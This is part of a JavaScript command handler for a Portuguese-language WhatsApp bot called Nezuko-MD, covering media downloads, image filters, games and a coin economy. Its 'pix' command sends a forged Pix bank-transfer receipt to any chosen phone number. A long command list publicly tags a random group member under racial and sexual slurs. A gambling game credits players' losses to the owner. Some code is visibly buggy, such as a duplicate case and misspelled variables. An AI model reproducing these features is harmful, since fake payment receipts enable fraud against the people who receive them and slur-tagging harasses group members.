pla += `⏳ *Publicado em:* ${anu.publicado}\n`
pla += `🔎 *_Aguarde, estou enviando o áudio!_*`
img = await getBuffer(anu.thumb)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})
nezuko.sendMessage(from, { audio: { url: anu.link }, mimetype: 'audio/mpeg', fileName: `${anu.título}.mp3` }, { quoted: dnselo})
break

case 'ytmp4-v2': 
// @VitinhoGostoso
url = args.join(' ')
if (!url) return reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
reply(enviar.espere)
anu = await fetchJson(`https://lolizit-api.herokuapp.com/api/download/ytmp4?url=${url}&apikey=apikeyFree30days`)
anu = anu.resultado
pla = `➡️ *Título:* ${anu.título}\n`
pla += `📬️ *Visualizações:* ${anu.visualizações}\n`
pla += `⚡️️ *Canal:* ${anu.canal}\n`
pla += `⏳ *Publicado em:* ${anu.publicado}\n`
pla += `🔎 *_Aguarde, estou enviando o video!_*`
img = await getBuffer(anu.thumb)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})
nezuko.sendMessage(from, { audio: { url: anu.link }, mimetype: 'video/mp4', fileName: `${anu.título}.mp4` }, { quoted: dnselo})
break

//======================================\\
case 'comunismo':
case 'bolsonaro':
case 'affect':
case 'blur':
case 'beautiful':
case 'circle':
case 'del':
case 'invert':
case 'facepalm':
case 'jail':
case 'rip':
case 'trash':
case 'wasted':
case 'wanted':
case 'sepia':
case 'pixelate':
case 'lgbt':
try {
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
reply(enviar.espere)
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
link = await upload(base64)
nezuko.sendMessage(from, {image: {url:`https://www.nezsab-apis.xyz/canvas/${command}?link=${link}&apikey=${keyapi}`}}, {quoted: dnselo}).catch(e => {
reply("Error!!")  
})
} else {
reply('Selecione uma imagem...!')
}
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel baixar essa música, espere retornar.")   
} else {
reply('ERROR!!')
}
}
break

case 'bluediscord':
case 'blackdiscord':
try {
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
reply(enviar.espere)
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
link = await upload(base64)
nezuko.sendMessage(from, {image: {url:`https://www.nezsab-apis.xyz/canvas/${command}?link=${link}&apikey=${keyapi}`}}, {quoted: dnselo}).catch(e => {
reply("Error!!")  
})
} else {
reply('Selecione uma imagem...!')
}
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel baixar essa música, espere retornar.")   
} else {
reply('ERROR!!')
}
}
break

//========WA.ME=============

case 'wame':
case 'wa.me':
reply(`「 *LINK WHATSAPP* 」\n\n_Solicitado por_ : *${pushname}*\n\nSeu link WhatsApp:\n\n*https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n\n*Ou*\n\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*\n\n𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`)
break

case 'wame2':
case 'wa.me2':
reply(`Seu Wame\nWa.me/${sender.split("@")[0]}`)
break

//========FIM=============

//========INÍCIO DOS JOGOS=============


case 'resetaki':
try {
if(akinator[0][from] && akinator[0][from].player != sender && !isGroupAdmins && !SoDono) return reply('*Não é você que está jogando*')
akinator[0][from] = undefined
fs.writeFileSync('./funções de cmd/funções/akinator.json', JSON.stringify(akinator, null, 2))
buttons_opts = [
{buttonId: 'akinator sim', buttonText: {displayText: 'Sim'}, type: 1},
{buttonId: 'akinator nao', buttonText: {displayText: 'Não'}, type: 1},
]
sendbuttonsMessage = {
text: `*Jogo reiniciado com sucesso! Deseja jogar outra partida?*`,
footer: 'Sim ou não?',
buttons: buttons_opts,
headerType: 1
}
nezuko.sendMessage(from, sendbuttonsMessage)
} catch {
reply("Nenhuma sessão em andamento...")
}
break

case 'romantic':
fre = await fetchJson(`https://supra-api.herokuapp.com/api/romanticafrase?apikey=supraz`)
romantic = `Frase Romântica: ︎${fre.frase}`
nezuko.sendMessage(from, {text: romantic}, {quoted: dnselo})
break

case 'doge':
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerFromUrl(from, pjr)
}
)
await limitAdd(sender)
break

case 'gato':
case 'gata':
case 'gatos':
case 'gatinhos':
Cleiton = `Cute Cute🐈‍⬛❤️‍🩹`
nezuko.sendMessage(from, {image: {url: `https://cataas.com/cat?type=sq`}, caption: Cleiton})
break

case 'sticker-cat':
case 'fig-gato':
sendStickerFromUrl(from, "https://cataas.com/cat?type=sq", dnselo)
break

case 'jogo':
case 'gamer':
if (!texto) return reply(`Digite o nome do jogo para que eu possa pesquisar\n\nExemplo: ${prefix + command} Minecraft`);
reply('Pesquisando jogo...');
 phaticusthiccy.system_requirements(`${texto}`).then(async (res) => {
    //envJSON(data)
let dadosjogo = `\t\t\t\t*${texto}*

*Nome:* ${res.game.name}
*Lançamento:* ${res.game.release_date}
*Desenvolvedora:* ${res.game.developer}
*Editora:* ${res.game.publisher}
*Genero:* ${res.game.genre}

*- Requisitos Mínimos*

*CPU:* ${res.system_requirements.minimum.cpu}
*GPU:* ${res.system_requirements.minimum.gpu}
*RAM:* ${res.system_requirements.minimum.ram}
*HDD:* ${res.system_requirements.minimum.hdd}
*DirectX:* ${res.system_requirements.minimum.directx}
*OS:* ${res.system_requirements.minimum.os}

*- Requisitos Recomendados*

*CPU:* ${res.system_requirements.recommended.cpu}
*GPU:* ${res.system_requirements.recommended.gpu}
*RAM:* ${res.system_requirements.recommended.ram}
*HDD:* ${res.system_requirements.recommended.hdd}
*DirectX:* ${res.system_requirements.recommended.directx}
*OS:* ${res.system_requirements.recommended.os}

*- REVIEWS SOBRE:*

*Popularidade:* ${res.reviews.popularity}
*Gráficos:* ${res.reviews.graphics}
*Design:* ${res.reviews.design}
*GamePlay:* ${res.reviews.gameplay}
*Som:* ${res.reviews.sound}
*Música:* ${res.reviews.music}
*Inovações:* ${res.reviews.innovations}
*Geral:* ${res.reviews.overall}

`
nezuko.sendMessage(from, { image: { url: res.game.avatar }, caption: dadosjogo }, {quoted: mek});
}).catch(e => {
reply('Jogo não encontrando.')
console.log(e)
})
break

//======== PUXADAS =============//


//==============FIM===============\\

case 'nazista': 
case 'legal': 
case 'rico': 
case 'rockeiro':
case 'retardado': 
case 'sadboy': 
case 'toxico':
case 'lindo': 
case 'frio': 
case 'homofobico': 
case 'pobre':  
case 'feio': 
case 'cauculista': 
case 'inativo': 
case 'baiano': 
case 'feio':
case 'feia':
case 'burro':
case 'burra':
case 'gordo':
case 'pobre':
case 'bonito':
case 'bonita':
case 'mamaco':
case 'gostoso':
case 'gostosa':
case 'maconheiro':
case 'maconheira':
case 'gado':
case 'gada':
case 'putinha':
case 'chifrudo':
case 'riquinho':
case 'riquinha':
case 'dragão':
case 'kengo':
case 'kenga':
case 'trouxa':
case 'iludido':
case 'iludida':
case 'palhaço':
case 'palhaça':
case 'corno':
case 'corna':
case 'puta':
case 'vagabundo':
case 'vagabunda':
case 'santo':
case 'santa':
case 'punheteiro':
case 'otaku':
case 'lolicon':
case 'preto':
case 'feio':
case 'lixo':
case 'burro':
case 'gordo':
case 'pobre':
case 'corno':
case 'bonito':
case 'macaco':
case 'gostoso':
case 'fimose':
if (!isGroup) return reply(mess.group)
d = []
teks = `O mais *${command}* é: `
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `@${groupMembers[r].id.split('@')[0]}`
d.push(groupMembers[r].id)
}
await mentions(teks, d, true)
break

case 'omais':
d = []
teks = `O mais${body.slice(6)} é o `
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `@${groupMembers[r].id.split('@')[0]}`
d.push(groupMembers[r].id)
}
await mentions(teks, d, true)
break

//

case 'audiomeme': // Por: NezSab-API
nezuko.sendMessage(from, {react: {text: '✅️', key: info.key}})
try {
if (args.length < 1) return reply(`Uso incorreto do comando!\nExemplo: *${prefix + command} Bolsonaro*`)
anu = await fetchJson(`https://nezsab-apis.xyz/api/audiomeme?text=${q}&apikey=${keyapi}`)
nezuko.sendMessage(from, {audio: {url: `${anu.resultado.audio}`}, mimetype: 'audio/mp4', ptt:true}, {quoted:dnselo})
setTimeout(() =>{ nezuko.sendMessage(from, {text: `⸙͎۪۫ ⊰ Olá *${pushname}*, ♡\n*Deseja outro áudio?* Clique no botão "Próximo Áudio".`, footer: `Por: ${NomeDoBot}`, buttons: [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐎-𝐀𝐔𝐃𝐈𝐎💢'}, type: 1}]}, {quoted: dnselo}) }, 2090)
                } catch(e) {               
                    console.log(e)
                    nezuko.sendMessage(from, {react: {text: `❌️`, key: info.key}})
                    reply('Nenhum resultado foi encontrado, tente novamente!')
                }
break

case 'play':
if (args.length < 1) return reply(`Exemplo:\n${command} mc poze`)
srch = args.join(" ")
ytbusca = await yts(srch);
ytbr = ytbusca.all
res = await yts(srch)
var link = ytbr[0].url
sections = []
ytbr.splice(10, ytbr.length)
ytlink = ytbr.url
ytbr.forEach((ytbr, i) =>{
sections.push({
rows: [ {
description: `${ytbr.title}`,
title: `🎶 𝐀́𝐔𝐃𝐈𝐎 🎶 Duração: ${ytbr.timestamp}`,
rowId: `${prefix}ytmp3 ${ytbr.url}`},
{description: `${ytbr.title}`,
title: `📽️ 𝐕𝐈́𝐃𝐄𝐎 📽️ Duração: ${ytbr.timestamp}`,
rowId: `${prefix}ytmp4 ${ytbr.url}`} ],
title: `𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`
})
}) 
nezuko.sendMessage(from, {text: `© Cᴏᴘʏʀɪɢʜᴛ Bʏ Nᴇᴢᴜᴋᴏ-MD`,title: `[🌺] Mᴜ́sɪᴄᴀ Eɴᴄᴏɴᴛʀᴀᴅᴀ [🌺]`,buttonText: "Cʟɪϙᴜᴇ Aϙᴜɪ", sections}, { quoted:info})
break

case 'play2':
if(!q) return reply(`Cade o nome?`)
nezuko.sendMessage(from, {react: {text: `⏳`, key: info.key}})
qp = args.join(" ")
res = await yts(qp)
blaimg = await getBuffer(res.all[0].image)
blalink = await getBuffer(res.all[0].url)
bla = `
⟮ _*◉ʏᴏᴜᴛᴜʙᴇ◉*_ ⟯ 
 
0.02━◉━━━━━━━━━━━━3.26
🔂 ⏪ ⏸️ ⏩🎵

❤️‍🔥 Titulo: ${res.all[0].title}
📈 Visualizações: ${res.all[0].views}
👀 Duração: ${res.all[0].timestamp}
🔎 Canal: ${res.all[0].author.name}
🗯 Link ${res.all[0].url}`
buttons02 = [
{buttonId: `${prefix}ytmp3 ${res.all[0].url}`, buttonText: {displayText: `Audio 🎶`}, type: 1},
{buttonId: `${prefix}ytmp4 ${res.all[0].url}`, buttonText: {displayText: `Video 🎥`}, type: 1},
{buttonId: `${prefix}ytdoc ${res.all[0].url}`,buttonText: {displayText: `Documento 🔞`}, type: 1}
]
buttonMessage02 = {
image: await getBuffer(res.all[0].image),
sendEphemeral: true,
Thumbnail: await getBuffer(res.all[0].thumbnail),
mentions: [sender],
caption: bla,
 footer: ``,
buttons: buttons02,
headerType: 4, contextInfo: {externalAdReply : {title : `𝚫 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿 ⫹⫺`, renderLargerThumbnail:false, showAdAttribution: true, body: `9:07●━━━━━━── 10:49⇆`, mediaUrl: `${q}`, mediaType: 2, thumbnail: fs.readFileSync('./funções de cmd/mídia-ft-vd/fotos/nezuko2.jpg')
 }}}
nezuko.sendMessage(from, buttonMessage02)
break

case 'ytaudio':
nezuko.sendMessage(from, {react: {text: `🌹`, key: info.key}})
                try{
                   if(args.length < 1) return reply('<❗> Cadê o nome?')
                if(!args[0]) return reply('『 ❌ 』Isso não é o nome de uma música do YouTube.')
                    anumusic = await new Youtube().ytmp3(args[0])
                    buff = await getBuffer(anumusic.dl_link)
                    ran = getRandom('.mp3')
                    reply('Baixando o áudio, aguarde...')
                    await nezuko.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg', contextInfo: {externalAdReply : {title : `Música: ${anumusic.title}`, renderLargerThumbnail:false, showAdAttribution: true, body: `By: 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`, mediaUrl: `${q}`, mediaType: 2, thumbnail: fs.readFileSync('./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg') }}}, {quoted: dnselo})
                } catch(e) {
                    console.log(e)
                    reply('Error')
                }
                break

case "playaudio":
q = args.join(' ')
bla = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/yt/playmp4?apikey=apiteam&query=${q}`) 
audbla = await getBuffer(bla.url)
nezuko.sendMessage(m.chat, {audio: audbla, mimetype: "audio/mp4"}, {quoted: dnselo})
break


case 'ytdoc':
nezuko.sendMessage(from, {react: {text: `⏳`, key: info.key}})
                try{
                    if(args.length < 1) return reply('<❗> Cadê o nome?')
                if(!args[0]) return reply('『❌』Isso não é o nome de uma música do YouTube.')
                    anumusic = await new Youtube().ytmp3(args[0])
                    buff = await getBuffer(anumusic.dl_link)
                    ran = getRandom('.mp3')
                    reply('Baixando o documento, aguarde...')
                    await nezuko.sendMessage(from, {document: buff, mimetype: 'audio/mpeg',
fileName: anumusic.title+'.mp3',
contextInfo: {externalAdReply : {title : `Música: ${anumusic.title}`, renderLargerThumbnail:false, showAdAttribution: true, body: `By: 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`, mediaUrl: `${q}`, mediaType: 2, thumbnail: fs.readFileSync('./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg') }}}, {quoted: dnselo})
                } catch(e) {
                    console.log(e)
                    reply('Error')
                }
                break

case 'ytmp4': case 'play_video':
try {
qp = args.join(" ")
if(!qp) return reply(`Cade o link da música/video?`)
reply(enviar.espere)
res = await yts(qp)
bla = await fetchJson(`https://nezsab-apis.xyz/youtube/mp4?link=${qp}&apikey=${keyapi}`) 
audbla = await getBuffer(bla.resultado.download)
nezuko.sendMessage(from, {video: audbla, mimetype: 'video/mp4'}, {quoted: info}).catch(e => {
reply('<❌️️> Erro ao baixar a mídia, tente novamente mais tarde!')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('<❌️️> Erro ao baixar a mídia, tente novamente mais tarde!')
}
}
break

case 'ytmp5':
try {
qp = args.join(" ")
if(!qp) return reply(`Cade o link da música/video?`)
reply(enviar.espere)
res = await yts(qp)
bla = await fetchJson(`https://nezsab-apis.xyz/youtube/mp4?link=${qp}&apikey=${keyapi}`) 
audbla = await getBuffer(bla.resultado.download)
nezuko.sendMessage(from, {audio: audbla, mimetype: 'audio/mp4'}, {quoted: info}).catch(e => {
reply('<❌️️> Erro ao baixar a mídia, tente novamente mais tarde!')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('<❌️️> Erro ao baixar a mídia, tente novamente mais tarde!')
}
}
break

case 'ytmp3':
case 'ytmp34':
nezuko.sendMessage(from, {react: {text: `⏳`, key: info.key}})
try{
if(args.length < 1) return reply('CADE O LINK ANIMAL')
if(!args[0]) return reply('❌ Isso não é um link do youtube ❌')
anumusic = await new Youtube().ytmp3(args[0])
buff = await getBuffer(anumusic.dl_link)
ran = getRandom('.mp3')
reply('「▰▰▰▰▱▱」enviando vida...')
await nezuko.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg'}, {quoted: dnselo})
} catch(e) {
console.log(e)
reply('Error')
}
break

case 'ytmp33': {
nezuko.sendMessage(from, {react: {text: `🇧🇷`, key: info.key}})
if (!q) return reply(`Cadê o link do vídeo? 🥱`)
playdobiel = args.join(' ')
reply (`Aguarde *${pushname}*... ☕`)
anu = await fetchJson(`https://nezsab-apis.xyz/api/ytmp4?url=${playdobiel}&apikey=${keyapi}`)
pla = `ೋ🏷 𝘛𝘪́𝘵𝘶𝘭𝘰⧽ ${anu.resultado.título}\n`
pla += `ೋ📊️️ 𝘝𝘪𝘴𝘶𝘢𝘭𝘪𝘻𝘢𝘤̧𝘰̃𝘦𝘴⧽ ${anu.resultado.visualizações}\n`
pla += `ೋ🧧 𝘊𝘢𝘯𝘢𝘭⧽ ${anu.resultado.canal}\n`
pla += `ೋ📮 𝘗𝘶𝘣𝘭𝘪𝘤𝘢𝘥𝘰⧽ ${anu.resultado.publicado}`
img = await getBuffer(anu.resultado.thumb)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo}) 
nezuko.sendMessage(from, { audio: { url: anu.resultado.link }, mimetype: 'audio/mpeg', fileName: `${anu.resultado.título}.mp3` }, { quoted: dnselo })
}
break

case 'play5':
                try{
                nezuko.sendMessage(from, {react: {text: `✅`, key: info.key}})
                piks = args.join(` `)
                   if(piks < 1) return reply('<❗> Cadê o título da música?')
                    anumusic = await fetchJson(`https://nezsab-apis.xyz/api/youtube/playmp3-3?q=${piks}&apikey=${keyapi}`)                                 
 // Informações do Play:
pla = `𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐏𝐋𝐀𝐘-𝐌𝐏𝟑\n`
pla += `ೋ🏷 𝘛𝘪́𝘵𝘶𝘭𝘰⧽ ${anumusic.resultado.titulo}\n`
pla += `ೋ📊️️ 𝘝𝘪𝘴𝘶𝘢𝘭𝘪𝘻𝘢𝘤̧𝘰̃𝘦𝘴⧽ ${anumusic.resultado.visualizações}\n`
pla += `ೋ🧧 𝘊𝘢𝘯𝘢𝘭⧽ ${anumusic.resultado.canal}\n`
pla += `ೋ⏰ 𝘋𝘶𝘳𝘢𝘤̧𝘢̃𝘰⧽ ${anumusic.resultado.duração}`
                    img = await getBuffer(anumusic.resultado.thumb)       
                    nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})   
                    // Download da música 
                    buff = await getBuffer(anumusic.resultado.audio_src)
                    ran = getRandom('.mp3')
                               reply(`⬇️ *BAIXANDO A MÚSICA!* ⬇️`)
                    await nezuko.sendMessage(from, {audio: buff, mimetype: 'audio/mpeg', contextInfo: {externalAdReply : {title : `Música: ${anumusic.resultado.titulo}`, renderLargerThumbnail:false, showAdAttribution: true, body: `By: ${NomeDoBot}`, mediaUrl: `${q}`, mediaType: 2, thumbnail: fs.readFileSync('./funções de cmd/mídia-ft-vd/fotos/nezuko2.jpg') }}}, {quoted: dnselo})
                } catch(e) {
                    console.log(e)
                    reply('<❗>  Algum erro detectado ou api caiu.')
                }
                break

case 'play3': 
// @Daniel
reply(enviar.espere)
playdobiel = args.join(' ')
anu = await axios.get(`https://api.brizaloka-api.tk/sociais/ytplaymp3?apikey=brizaloka&query=${playdobiel}`)
pla = `➡️ *Título:* ${anu.data.titulo}\n`
pla += `📬️ *Visualizações:* ${anu.data.views}\n`
pla += `🗞️️ *Canal:* ${anu.data.canal.name}\n`
pla += `⏳ *Duração:* ${anu.data.duration}\n`
pla += `🔎 _*Aguarde, estou enviando o áudio!*_`
img = await getBuffer(anu.data.thumb)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})
nezuko.sendMessage(from, { audio: { url: anu.data.audio_src }, mimetype: 'audio/mpeg', fileName: `${anu.data.titulo}.mp3` }, { quoted: dnselo})
break

case 'play4': 
// @Nezuko-MD by daniel
qp = args.join(" ")
res = await yts(qp)
nezuko.sendMessage(from, {react: {text: `⏳`, key: info.key}})
blaimg = await getBuffer(res.all[0].image)

bla = `▢ *Título:* ${res.all[0].title}\n▢ *Visualizações:* ${res.all[0].views}\n▢ *Duração:* ${res.all[0].timestamp}\n▢ *Canal:* ${res.all[0].author.name}`
sendBimg(from, `${res.all[0].image}`, bla, "© _Copyright by Nezuko-MD_", [
{buttonId: `${prefix}ytmp3 ${q}`, buttonText: {displayText: `🎶 Download [ Áudio ]`}, type: 1}, {buttonId: `${prefix}playaud ${q}`, buttonText: {displayText: `☔ Playlist [ YouTube ]`}, type: 1}], dnselo)
break 

case 'play5': 
reply(enviar.espere)
playdobiel = args.join(' ')
anu = await axios.get(`https://api.brizaloka-api.tk/sociais/v2/ytplaymp3?apikey=brizaloka&query=${playdobiel}`)
pla = `➡️ *Título:* ${anu.data.titulo}\n`
pla += `📊️ *Visualizações:* ${anu.data.views}\n`
pla += `🗞️️ *Canal:* ${anu.data.canal.name}\n`
pla += `⏳ *Duração:* ${anu.data.duration}\n`
pla += `_*Aguarde, estou enviando o áudio!*_`
img = await getBuffer(anu.data.thumb)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})
nezuko.sendMessage(from, { audio: { url: anu.data.link_src }, mimetype: 'audio/mpeg', fileName: `${anu.data.titulo}.mp3` }, { quoted: dnselo})
break

case 'play6': 
// @VitinhoGostoso
reply(enviar.espere)
playdobiel = args.join(' ')
anu = await axios.get(`https://sabrina-api.herokuapp.com/youtube/playmp3?&q=${q}&apikey=${keysabrina}`)
pla = `➡️ *Título:* ${anu.data.resultado.titulo}\n`
pla += `📊️ *Visualizações:* ${anu.data.resultado.views}\n`
pla += `🎞️️️ *Canal:* ${anu.data.resultado.canal}\n`

pla += `📆 *Data de postagem:* ${anu.data.resultado.postado_em}\n`
pla += `🔎 _*Aguarde, estou enviando o áudio!*_`
img = await getBuffer(anu.data.resultado.thumb)
nezuko.sendMessage(from, {image: img, caption: `${pla}`}, {quoted: dnselo})
nezuko.sendMessage(from, { audio: { url: anu.data.resultado.download }, mimetype: 'audio/mp4', fileName: `${anu.data.resultado.titulo}.mp3` }, { quoted: dnselo})
break

case 'pix':// By Lichtzin
{
txt = args.join(" ")
if(!SoDono) return reply(`Exemplo: ${prefix + command} +55 21 96452-3665/30`)
let aqua1 = txt.split("/")[0].replace(/\D/g,'');
let aqua2 = txt.split("/")[1];
if(!aqua1) return reply('CHAVE PIX DA PESSOA?/número de telefone')
if(!aqua2) return reply('QUAL O VALOR DO PIX?')
let [result] = await nezuko.onWhatsApp(aqua1)
if(!result) return reply(`Número inválido`)
bla = 
`[💠]  𝗣𝗜𝗫 𝗡𝗘𝗭𝗨𝗞𝗢  [💠]
Transferência Pix Recebida Com Sucesso

[👤] 𝗢𝗥𝗜𝗚𝗘𝗠: ${pushname}
[🏦] 𝗕𝗔𝗡𝗖𝗢: NEZUKO SUPREMO
[💱] 𝗧𝗔𝗥𝗜𝗙𝗔: Grátis 
[💸] 𝗩𝗔𝗟𝗢𝗥: ${aqua2},00`
nezuko.sendMessage(result.jid, {text: bla})
reply(`[💠] 𝗖𝗢𝗠𝗣𝗥𝗢𝗩𝗔𝗡𝗧𝗘 [💠]\nTransferência Pix Realizada com Sucesso\n\n[💱] 𝗧𝗔𝗥𝗜𝗙𝗔: Gratis\n[👤] 𝗢𝗥𝗜𝗚𝗘𝗠: ${pushname}\n[📆] 𝗗𝗔𝗧𝗔: ${date}\n[⏱️] 𝗛𝗢𝗥𝗔: ${time}\n\n[🗣️] 𝗗𝗘𝗦𝗧𝗜𝗡𝗢: wa.me/${result.jid.split("@")[0]}\n[💸] 𝗩𝗔𝗟𝗢𝗥: ${aqua2},00`)
}
break

case 'saldo'://by Daniel
if (!isGame && !isGroupAdmins) return reply(mensagem[0].game);
var salldo = checkATMuser(sender) 
const limite = {salldo}
if (limite < 100000 ) {status = 'Classe média'} else if (limite == 1000000 ) {status = 'Milionário'} else if (limite == 1000000000 ) {status = 'Bilionário'} 
else if (limite == 100000 ) {status = 'Classe pobre'}

pinga = `┏━──────「令」──────━┓
│ㅤㅤ *STATUS BANCÁRIO*    ㅤ│
┗━──────「令」──────━┛
│
│Nome: *${pushname}*
│Número: *${sender.split("@")[0]}*
│Situação Bancária: *Undefined*
│Instituição: *CoinBank*
│Saldo disponível: *${salldo}*
│
┗━──────「令」──────━┛`

nezuko.sendMessage(from, {text: pinga, footer: `Caso queira fazer transferência, use o botão a baixo`, buttons: [{buttonId: `${prefix}helptransf`, buttonText: {displayText: 'REALIZAR TRANSFERÊNCIA'}, type: 1}]}, {quoted: mek})
break

case 'pix2'://by Daniel
if (!isGame && !isGroupAdmins) return reply(mensagem[0].game);
if (args.length < 1) return reply(`Modo certo de se usar ${prefix}transferir @ | valor`)
      
                    if (!q.includes('|')) return reply(`Você precisa colocar o valor que deseja transferir.\n\nExemplo:\n\n*${prefix}Pix @pessoa | 3000*`)
                const tujuan = q.substring(0, q.indexOf('|') - 1)
                const jumblah = q.substring(q.lastIndexOf('|') + 1)
                if(isNaN(jumblah)) return await reply('O valor precisa está em números...')
                if (jumblah < 50 ) return reply(`transfrência mínima e de 50 Coins`)
                if (checkATMuser(sender) < jumblah) return reply(`Você não tem Coins suficiente para fazer uma transferência, você precisa ter no minímo 1000 de Coins`)
                const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                fee = 0.00 *  jumblah //IMPOSTO CADA 1 DE DINHERO, ALMENTA E CAI NA SUA CONTA, TODA VEZ QUÊ ALGUÉM FAZER TRANSFERENCIA
                hasiltf = jumblah - fee
                addKoinUser(tujuantf, hasiltf)
                confirmATM(sender, jumblah)
                addKoinUser('5521964523665@s.whatsapp.net', fee)
                
                pingaa = `*TRANSFERÊNCIA CONCLUÍDA*

Origem: *${sender.split("@")[0]}*
Destinatário: *${tujuan}*
Valor transferêrido: *${jumblah}*
Instituição: *CoinBank*
Tarifa sobre: *0,00*`;
              
                nezuko.sendMessage(from, {text: pingaa, footer: `Deseja vê seu saldo atualizado?`, buttons: [{buttonId: `${prefix}saldo`, buttonText: {displayText: 'CONSULTA SALDO'}, type: 1}]}, {quoted: m})
break     
 case 'helptransf'://by Daniel
			        pingu = `Para fazer uma transferência de Coins para outra pessoa faça o seguinte, exemplo de como se usar: ${prefix}pix @ | 1000\n não esqueça de usar o |`

			        nezuko.sendMessage(from, {text: pingu}, {quoted : mek})
break

case 'apostar'://by Daniel
if (!isGame && !isGroupAdmins) return reply(mensagem[0].game);
if (!isGroup) return reply('Comando apenas para grupo') 
const dinheiro = checkATMuser(sender)
const checkxpr = checkATMuser(sender, dinheiro) 
const quantidader = `50`
if (checkxpr <= quantidader) return reply(`desculpe vc ainda não  pode apostar😕 somente com  ${quantidader} de Coins.\n\nSuas Coins: ${checkxpr}`)
if (args.length !== 1) return reply('Especifique a quantidade de Coin para apostar.')
if (Number(args[0]) >= checkxpr || Number(args[0]) >= dinheiro) return reply(`Você não pode apostar uma quantidade de dinheiro maior do que a você tem, e nosso limite de apostas é de ${quantidader} dinheiro por vez!\n\nSeu dinheiro: ${checkxpr}`)
if (Number(args[0]) < 50) return reply(`O minimo para se apostar é de 50 Coins`)
if (isNaN(args[0])) return reply('Para apostar use apenas números, nada de inserir letras, a menos que queira perder todo o XP que tenha.')
const double = Math.floor(Math.random() * 7) + 1
const nrolxp = Number(-args[0])
const prolxp = double + Number(args[0])
if (double == 1) {
await reply(`🔪BANG!!!💣\n\nVocê perdeu na roleta-russa, causando uma perca de ${nrolxp} em seu dinheiro.`)
addKoinUser(sender, nrolxp, dinheiro)
addKoinUser(`${numerodonoa}@s.whatsapp.net`, prolxp)
} else if (double == 2) {
await reply(`Você Ganhou🥳\nSobreviveu ao tiro e recebeu ${prolxp} Coins`)
addKoinUser(sender, prolxp, dinheiro)
} else if (double == 3) {
await reply(`Poxa você está sem sorte😓\n\nVocê perdeu ${nrolxp}\não desista continue apostando😎🤙`)
addKoinUser(sender, nrolxp, dinheiro)
addKoinUser(`${numerodonoa}@s.whatsapp.net`, prolxp)
} else if (double == 4) {
await reply(`Essa foi por pouco!!😬\n\nVocê consegiu concluir o golpe e ganhou ${prolxp} Coins`)
addKoinUser(sender, prolxp, dinheiro)
} else if (double == 5) {
await reply(`Você errou o cavalo️\n\nAcabou perdendo ${nrolxp} em seu dinheiro, que tal..apostar mais alto??🤫.`)
addKoinUser(sender, nrolxp, dinheiro)
addKoinUser(`${nunerodonoa}@s.whatsapp.net`, prolxp)
} else if (double == 6) {
await reply(`🥳Aeeeeee🥳\n\nVocê finalmente ganhou, receba seus ${prolxp} de Coins🔷️`)
addKoinUser(sender, prolxp, dinheiro)
}
break
//======================================\\


//===============COMANDOS DE GRUPO======================

case 'timegrup': case 'timegroup': //comando by: Lichtzin 
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
nezuko.sendMessage(from, { react: { text: `☔`, key: m.key }})
{
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
adivinhaa = info.key.id.length > 21 ? 'Android 🥴' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE 🔋🔌' : 'ZAP DA WEB 💻';
sections = [
{
title: "[☔] NEZUKO BOT [☔] ",
rows: [
{title: "[☔] 30 SEGUNDOS [☔]", rowId: `${prefix}grupo30s`},
{title: "[☔] 01 MINUTO [☔]", rowId: `${prefix}grupo1m`},
{title: "[☔] 02 MINUTOS [☔]", rowId: `${prefix}grupo2m`},
